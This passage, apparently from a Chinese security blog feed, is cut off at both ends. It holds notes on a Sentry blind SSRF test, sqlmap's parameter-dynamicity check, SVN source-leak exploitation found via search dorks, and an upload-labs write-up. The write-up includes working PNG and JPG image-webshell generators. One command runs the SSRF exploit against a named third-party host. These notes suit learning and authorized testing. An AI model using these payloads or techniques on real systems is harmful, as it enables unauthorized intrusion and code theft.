<p>获取不到预期的返回包(含doc链接),是因为在这之前还必须要有个js请求,这种请求用模拟发包一般是实现不了的,除非再花时间理解那个js文件,再模拟js的请求.</p>
<p>如果这样处理就会有点麻烦,一般这种情况,上无头浏览器是比较通用的解决办法.</p>
<hr>
<h2 id="错误的debug思路"><a href="#错误的debug思路" class="headerlink" title="错误的debug思路:"></a>错误的debug思路:</h2><p>一开始debug的思路是不正确的,没有经过细致的排查,猜测的依据也只是根据印象,有点想当然了.</p>
<p>自己在调用<code>nyawc</code>框架的时候,是有做跟url后缀处理相关的请求.</p>
<p>不过这个处理只是过滤掉一些提前预设的静态url,如<code>&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;jpeg&quot;, &quot;woff&quot;, &quot;ttf&quot;, &quot;eot&quot;, &quot;svg&quot;, &quot;woff2&quot;, &quot;ico&quot;</code>,然后过滤掉这些url,不对这些url发送新的请求.</p>
<p>而我的猜测的依据 就是看到这个url<code>http://atmos.sysu.edu.cn/article/2005</code>是个无后缀的Url,就简单猜测,并把问题定位在: <code>nyawc</code>处理不了无后缀的url.</p>
<p>这个问题定位过于宽泛了.因为</p>
<ul>
<li>后缀的处理是请求前的问题</li>
<li>解析链接是请求后的问题</li>
</ul>
<hr>
<h2 id="正确的debug思路"><a href="#正确的debug思路" class="headerlink" title="正确的debug思路:"></a>正确的debug思路:</h2><ul>
<li>请求前: <strong>后缀处理是否有问题?</strong></li>
<li>请求中: <strong>是否请求到了正确的页面?并获得正确的返回结果?</strong><ul>
<li>一般的爬虫问题,获取不到预期的结果.最直接的办法还是比较浏览器请求的包与用<code>python</code>模拟发的包</li>
<li>如果发的包不同,那就是请求前的问题.如果发的包都相同，那就是请求后处理的问题.</li>
</ul>
</li>
<li>请求后: <strong>获得正确的返回结果后,是否能解析到?</strong></li>
</ul>
<hr>
<h2 id="改进"><a href="#改进" class="headerlink" title="改进:"></a>改进:</h2><ul>
<li><code>nyawc</code>这个爬虫框架还是有点局限的.可能后续要增加爬虫能力的话,还是要考虑上无头浏览器.</li>
<li>Debug要定位问题的时候,范围不能过于宽泛.排查的步骤不能漏.要能排列组合、没有交集的列出一二三.</li>
<li>要多看源码,理解要更深入.</li>
</ul>
<hr>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h1><p>设置brupsuite截取js请求.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d716322e4.jpg"></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.smashingmagazine.com/2011/11/introduction-to-url-rewriting/">URL重写简介</a></li>
<li><a href="https://www.zhihu.com/question/20282238">很多网站上的登陆页面等为什么没有后缀名？比如diandian&#x2F;register却没有.html等？</a></li>
<li><a href="http://www.itfuns.com/201.html">隐藏PHP后缀名的几种方法</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>sentry SSRF</title>
    <url>//12497.html</url>
    <content><![CDATA[<h1 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h1><p>一般在url上看到到有sentry都可以用Sentry（是一个实时事件日志记录和聚合平台）的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
<hr>
<h1 id="百度dork"><a href="#百度dork" class="headerlink" title="百度dork:"></a>百度dork:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102259.png" alt="20201118102259"></p>
<hr>
<h1 id="exp测试步骤"><a href="#exp测试步骤" class="headerlink" title="exp测试步骤:"></a>exp测试步骤:</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sentrySSRF.py -i https://sentry.tpxventures.com/auth/login/technomedia/ -d</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102724.png" alt="20201118102724"></p>
<p>brup collaborator收到请求</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102843.png" alt="20201118102843"></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102924.png" alt="20201118102924"></p>
<hr>
<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><ol>
<li>sentry关闭 source code scrapping；</li>
<li>保证配置文件中的黑名单不为空：&#x2F;sentry&#x2F;conf&#x2F;server.py</li>
</ol>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.cnblogs.com/mysticbinary/p/12979368.html">sentry SSRF</a></li>
<li><a href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a></li>
<li><a href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap源码-参数动态性检测</title>
    <url>//490.html</url>
    <content><![CDATA[<h1 id="参数动态性检测"><a href="#参数动态性检测" class="headerlink" title="参数动态性检测:"></a>参数动态性检测:</h1><p>直接抄一下别人的流程图:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/024A031F-AB6F-4E2F-BFD3-7FEB419DA68A.png"></p>
<p>其实很简单,简而言之</p>
<ul>
<li>将请求参数值替换成一个随机的四位数，发包获取结果</li>
<li>结果与原始页面做相似度的对比</li>
<li>如果不相似,那么这个参数具有动态性(这个参数的变化导致了页面的变化)</li>
</ul>
<hr>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码:"></a>代码:</h1><p>实际的代码也是很少。(如果在理解了页面相似度这个概念的前提下)</p>
<p>在开始检测的sql注入的<code>start()</code>函数有调用到<code>checkDynParam</code>函数</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/7653A023-2E37-4DAA-953B-2D704694060A.png"></p>
<p>经过这个检测参数动态性的函数之后,就可以看到熟悉的提示了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[23:16:00] [INFO] testing if GET parameter &#x27;id&#x27; is dynamic</span><br></pre></td></tr></table></figure>




<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkDynParam</span>(<span class="params">place, parameter, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This function checks if the URL parameter is dynamic. If it is</span></span><br><span class="line"><span class="string">    dynamic, the content of the page differs, otherwise the</span></span><br><span class="line"><span class="string">    dynamicity might depend on another parameter.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> kb.redirectChoice:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    kb.matchRatio = <span class="literal">None</span></span><br><span class="line">    dynResult = <span class="literal">None</span></span><br><span class="line">    randInt = randomInt() <span class="comment"># 生成一个四位随机数</span></span><br><span class="line"></span><br><span class="line">    paramType = conf.method <span class="keyword">if</span> conf.method <span class="keyword">not</span> <span class="keyword">in</span> (<span class="literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="keyword">else</span> place <span class="comment"># paramType:&#x27;GET&#x27;</span></span><br><span class="line"></span><br><span class="line">    infoMsg = <span class="string">&quot;testing if %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (paramType, parameter)</span><br><span class="line">    logger.info(infoMsg) <span class="comment"># 输出提示信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = agent.payload(place, parameter, value, getUnicode(randInt)) <span class="comment"># payload: u&#x27;id=__PAYLOAD_DELIMITER__1412__PAYLOAD_DELIMITER__&#x27;</span></span><br><span class="line">        dynResult = Request.queryPage(payload, place, raise404=<span class="literal">False</span>) <span class="comment"># 这里面会发包,并且判断相似度</span></span><br><span class="line">    <span class="keyword">except</span> SqlmapConnectionException:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    result = <span class="literal">None</span> <span class="keyword">if</span> dynResult <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="keyword">not</span> dynResult</span><br><span class="line">    kb.dynamicParameter = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>函数功能注释也解释了。</p>
<p>这个函数用于测试参数是否是动态的。如果它是动态的话，(替换成一个新的值之后)那么页面的内容会发生变化。</p>
<p>如果这个参数不是动态的，那么动态性可能要取决于别的参数。</p>
<hr>
<h1 id="inspire"><a href="#inspire" class="headerlink" title="inspire:"></a>inspire:</h1><p>在实际的渗透测试时，用brupsuite抓包的时候，会有这种感觉。</p>
<p>不知道对哪个参数下手，不知道对哪个参数的值替换成payload进行测试。</p>
<p>如果随机测了某个，又不知道其他的参数会不会漏。</p>
<p>但是如果了解了 <strong>参数动态性</strong> 这个概念之后,实际上这个问题可以转化为</p>
<p>这个数据包里面的哪些参数是动态的，也就是我修改了这个参数之后，服务端会拿对这个变化的参数进行处理，以致于页面(返回包)会发送变化。</p>
<p>那么很大可能性是 我这个参数影响到了某个sql语句的查询或者执行了。</p>
<p>那么这个参数就很有可能存在注入。</p>
<p><strong>总结一下，一个参数存在注入的前提是 这个参数具有动态性。</strong></p>
<blockquote>
<p>那么是不是可以编写一个brupsuite插件或者一个小工具，对数据包的参数批量的先检测它是否具有动态性,毕竟这个是注入的前提之一。</p>
</blockquote>
<hr>
<h1 id="refs："><a href="#refs：" class="headerlink" title="refs："></a>refs：</h1><ul>
<li><a href="https://paper.seebug.org/729/">sqlmap 检测剖析</a></li>
</ul>
<blockquote>
<p>根据这篇文章提出的关键概念点,可以比较好的作为了解sqlmap的路径。</p>
</blockquote>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/45291193">sqlmap 内核分析 III: 核心逻辑</a></li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>Svn源码泄露exploit</title>
    <url>//50672.html</url>
    <content><![CDATA[<h1 id="寻找测试目标"><a href="#寻找测试目标" class="headerlink" title="寻找测试目标:"></a>寻找测试目标:</h1><p>google hack: <code>Index of /.svn</code></p>
<h1 id="svnExploit工作原理"><a href="#svnExploit工作原理" class="headerlink" title="svnExploit工作原理"></a>svnExploit工作原理</h1><h2 id="判断svn版本号"><a href="#判断svn版本号" class="headerlink" title="判断svn版本号"></a>判断svn版本号</h2><p>通过根目录下的entries文件来判断</p>
<p>版本号&gt;1.7的话,</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73a42af8.jpg"></p>
<p>版本号&lt;1.7的话,</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73af3f2b.jpg"></p>
<h2 id="版本号小于1-7的情况"><a href="#版本号小于1-7的情况" class="headerlink" title="版本号小于1.7的情况:"></a>版本号小于1.7的情况:</h2><h3 id="解析元数据"><a href="#解析元数据" class="headerlink" title="解析元数据:"></a>解析元数据:</h3><p><code>.svn/entries</code> 包含了项目的文件和文件夹列表。</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73ba78ca.jpg"></p>
<p>可以解析这个文件来获取文件列表<code>file_list</code>和路径列表<code>dir_list</code>。</p>
<h3 id="循环解析元数据"><a href="#循环解析元数据" class="headerlink" title="循环解析元数据:"></a>循环解析元数据:</h3><p>上面收集了文件夹列表,进入每个文件夹继续解析元数据<code>entries</code>文件</p>
<p>现在有了整个项目结构了</p>
<h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><p>.SVN-BASE files store a base copy of a file</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73c5c73f.jpg"></p>
<p>在每个文件后面加上<code>.svn-base</code>,然后请求对应的url就可以下载文件</p>
<hr>
<h2 id="版本号大于1-7的情况"><a href="#版本号大于1-7的情况" class="headerlink" title="版本号大于1.7的情况:"></a>版本号大于1.7的情况:</h2><h3 id="下载数据库文件"><a href="#下载数据库文件" class="headerlink" title="下载数据库文件"></a>下载数据库文件</h3><p>下载<code>/.svn/wc.db</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73d53d53.jpg"></p>
<h3 id="连接数据库文件"><a href="#连接数据库文件" class="headerlink" title="连接数据库文件"></a>连接数据库文件</h3><p>从<code>Node</code>表中查询出 </p>
<ul>
<li>相对路径</li>
<li>文件类型</li>
<li>校验值</li>
</ul>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73e53b2e.jpg"></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d73f61b38.jpg"></p>
<h3 id="下载文件-1"><a href="#下载文件-1" class="headerlink" title="下载文件"></a>下载文件</h3><p>如果一个文件的<code>checksum</code>为 0a781ca8d6e963590f208608e3d80f52307a116d</p>
<p>那么其对应的url则为: domain&#x2F;.svn&#x2F;pristine&#x2F;<code>checksum前两位数</code>&#x2F;<code>checksum</code>加上.svn-base	</p>
<p>即<code>https://domain/.svn/pristine/0a/0a781ca8d6e963590f208608e3d80f52307a116d.svn-base</code></p>
<hr>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话:"></a>题外话:</h1><p>在测试<a href="https://github.com/admintony/svnExploit">svnExploit</a>的时候,发现有点小问题.提了个<a href="https://github.com/admintony/svnExploit/pull/1">pr</a>.</p>
<p>优化:</p>
<ul>
<li>1.thread-unsafe的Generator改用thread-safe的queue</li>
<li>2.兼容Py2</li>
</ul>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><p><a href="https://github.com/admintony/svnExploit">svnExploit</a></p>
</li>
<li><p><a href="https://www.rapid7.com/db/vulnerabilities/spider-svn-entries-disclosure">Subversion entries file information disclosure</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/20043472/multithreading-why-arent-generators-thread-safe-what-happens-when-it-is-share">multithreading: Why aren’t generators thread-safe? What happens when it is shared among threads?</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/20042534/python-why-different-threads-get-their-own-series-of-values-from-one-generator">Python: Why different threads get their own series of values from one generator?</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>uploadlab-二次渲染绕过</title>
    <url>//1606.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在做这个靶场的时候，发现pass17这一关还有点意思。<br><a href="https://github.com/c0ny1/upload-labs/blob/master/Pass-17/index.php">https://github.com/c0ny1/upload-labs/blob/master/Pass-17/index.php</a></p>
<p>主要考察的点是图片被渲染后，怎么再次在图片注入webshell payload.</p>
<p>想要绕过二次渲染的话，就要 <strong>搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。</strong> 这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同。</p>
<hr>
<h1 id="gif上传"><a href="#gif上传" class="headerlink" title="gif上传:"></a>gif上传:</h1><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法:"></a>绕过方法:</h2><p>gif二次渲染绕过说是最简单的。</p>
<p>将源文件和二次渲染过的文件进行比较，找出源文件中没有被修改的那段区域，在那段区域写入php代码即可。</p>
<p>用比较工具，可以迅速找到两者匹配的地方。在匹配处写入php代码即可。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程:"></a>过程:</h2><p>在gif尾部加上php的payload,上传经过渲染后,payload不见了。</p>
<p>上传前:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306112121.png" alt="20210306112121"></p>
<p>上传后:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306112202.png" alt="20210306112202"></p>
<p>用对比工具找到匹配的地方，然后用<code>winhex</code>写入payload即可</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306115049.png" alt="20210306115049"></p>
<p>结合文件包含试试:<br><a href="http://localhost/include.php?file=./upload/14830.gif">http://localhost/include.php?file=./upload/14830.gif</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306114904.png" alt="20210306114904"></p>
<hr>
<h1 id="png上传"><a href="#png上传" class="headerlink" title="png上传:"></a>png上传:</h1><p>直接记个方法，将php代码写入IDAT数据块。用别人的脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成的1.png如下图</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306153551.png" alt="20210306153551"></p>
<p>后续利用暂时没搞出来。</p>
<hr>
<h1 id="jpg上传"><a href="#jpg上传" class="headerlink" title="jpg上传:"></a>jpg上传:</h1><p>别人的脚本<br>jpg马生成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span 